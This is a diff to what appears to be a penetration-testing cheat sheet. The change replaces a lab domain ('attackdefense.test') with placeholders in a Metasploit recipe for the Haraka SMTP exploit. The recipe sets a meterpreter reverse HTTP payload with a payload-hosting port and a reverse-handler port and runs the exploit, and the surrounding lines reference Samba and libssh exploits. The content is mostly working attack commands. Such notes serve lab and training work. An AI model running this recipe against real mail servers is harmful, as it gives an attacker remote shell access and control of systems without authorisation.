@@ -581,14 +581,14 @@ use exploit/linux/samba/is_known_pipename
 ```
 use exploit/linux/smtp/haraka
 set SRVPORT <port1>
-set email_to root@attackdefense.test
+set email_to <email>
 set payload linux/x64/meterpreter_reverse_http
 set LPORT <port2>
 exploit
 ```
 - Payload is non-staged.
 - `<port1>` hosts the payload, `<port2>` is the reverse handler.
-- `email_to` must be valid i.e. `xxx@attackdefense.test`.
+- `email_to` must be valid i.e. `xxx@<valid_domain>`.
 
 ## SSH
 ### libssh v0.6.0-0.8.0
